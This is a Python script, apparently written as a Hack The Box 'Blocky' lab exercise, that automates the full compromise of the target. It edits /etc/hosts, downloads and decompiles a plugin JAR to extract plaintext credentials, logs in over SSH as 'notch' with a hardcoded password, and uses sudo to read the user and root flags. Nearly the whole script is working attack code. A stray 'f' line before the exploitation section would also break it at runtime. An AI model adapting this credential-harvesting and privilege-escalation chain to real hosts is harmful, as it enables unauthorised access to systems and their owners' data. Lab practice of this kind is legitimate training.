#!/usr/bin/env python3
#please install all modules you might not have and note that in my environment I needed to install fabric with Sudo privileges in order for it to work 
import sys
import os
import subprocess
from colorama import Fore, Style, init
from fabric import Connection, Config
import getpass

init(autoreset=True)

HOSTS_FILE = "/etc/hosts"
HOSTADDR = "blocky.htb"
JAR_FILE = "BlockyCore.jar"

print(Fore.BLUE + "[*] This script is intended for the HTB Blocky lab. Level: Easy!\n"
      "[*] Demonstrates Python automation for uses in cybersecurity!\n")

# Privilege check as some functions in this code need higher privileges
# I would never suggest letting a program run on sudo without checking why
if subprocess.run(
    ["id", "-u"], capture_output=True, text=True
).stdout.strip() != "0":
    print(Fore.RED + "[!] This script must be run with sudo")
    print(Fore.RED + "[!] sudo python cuteblocky.py")
    sys.exit(1)

# Hosts file update
ipaddr = input(Fore.BLUE + "[*] Blocky's IP Address: " + Style.RESET_ALL)

new_entry = f"{ipaddr} {HOSTADDR}\n"
updated = False

with open(HOSTS_FILE, "r") as f:
    lines = f.readlines()

new_lines = []
for line in lines:
    if line.strip().endswith(HOSTADDR):
        if not updated:
            new_lines.append(new_entry)
            updated = True
    else:
        new_lines.append(line)

if not updated:
    new_lines.append(new_entry)
    print(Fore.GREEN + "[+] Added blocky.htb to /etc/hosts")
else:
    print(Fore.RED + "[*] Updated blocky.htb IP in /etc/hosts")

with open(HOSTS_FILE, "w") as f:
    f.writelines(new_lines)

# Helper functions
def run_curl(url):
    try:
        result = subprocess.run(
            ["curl", "-s", url],
            capture_output=True,
            text=True,
            check=True
        )
        return result.stdout
    except subprocess.CalledProcessError:
        return None

def run_wget(url):
    try:
        subprocess.run(
            ["wget", "-q", url],
            check=True
        )
        print(Fore.GREEN + "[+] File downloaded successfully")
        return True
    except subprocess.CalledProcessError:
        return False

def run_unzip(filename):
    try:
        subprocess.run(
            ["unzip", "-o", filename],
            check=True
        )
        print(Fore.GREEN + "[+] Unzip completed successfully")
        return True
    except subprocess.CalledProcessError:
        return False

url = f"http://{HOSTADDR}/plugins/"
output = run_curl(url)

if not output:
    print(Fore.RED + "[!] Could not access plugins directory")
    sys.exit(1)

print(Fore.BLUE + "[+] Found plugins directory:\n")
print(output)


print(Fore.BLUE + f"[*] Downloading {JAR_FILE}")
download_url = f"http://{HOSTADDR}/plugins/files/{JAR_FILE}"

if not run_wget(download_url):
    print(Fore.RED + "[!] Failed to download JAR")
    sys.exit(1)

print(Fore.BLUE + f"[*] Unzipping {JAR_FILE}")

if not run_unzip(JAR_FILE):
    print(Fore.RED + "[!] Failed to unzip JAR")
    sys.exit(1)

# Decompiling BlockCore.class to show plaintext credentials present in file
def decompile_class():
    try:
        result = subprocess.run(
            ["javap", "-c", "com/myfirstplugin/BlockyCore.class"],
            capture_output=True,
            text=True,
            check=True
        )

        print(Fore.GREEN + "\n[+] Decompiled BlockyCore.class and grabbing credential line!\n")

        found = False
        for line in result.stdout.splitlines():
            if "#22" in line:
                print(Fore.WHITE + line)
                found = True

        if not found:
            print(Fore.RED + "[-] No references to #22 found")

    except subprocess.CalledProcessError as e:
        print(Fore.RED + "[!] javap failed")
        print(e.stderr)

decompile_class()

f
# Exploitation of Sudo privileges of the user Notch(found username while enumerating website) via ssh to retrieve logins
while True:
    answer = input(Fore.RED + "\nDo you want to continue with exploitation and priviledge esculation? (yes/no): ").lower()

    if answer == "yes":
        print(Fore.BLUE + "[*] Exploitating Sudo Privileges of User Notch and Grabbing Flags!\n")
        sudo_pass = "8YsqfCTnvxAUeduzjNSXe22"
        config = Config(overrides={'sudo': {'password': sudo_pass}})
        #here is how I connect to SSH using python and fabric
        conn = Connection(f'notch@{ipaddr}', config=config, connect_kwargs={"password": "8YsqfCTnvxAUeduzjNSXe22"})     

        print(Fore.GREEN + "[*]User and Root flags are shown after [sudo] password:\n")
        print(Fore.BLUE + "[*]User flag has been successfully grabbed!") 
        conn.sudo('cat user.txt')
        print(Fore.RED + "[!]] Root flag has been successfully grabbed!")
        conn.sudo('cat /root/root.txt')
        sys.exit()
    elif answer == "no":
        print(Fore.GREEN + "[✓] Program Closed")
        break
    else:
        print("Please enter yes or no.")



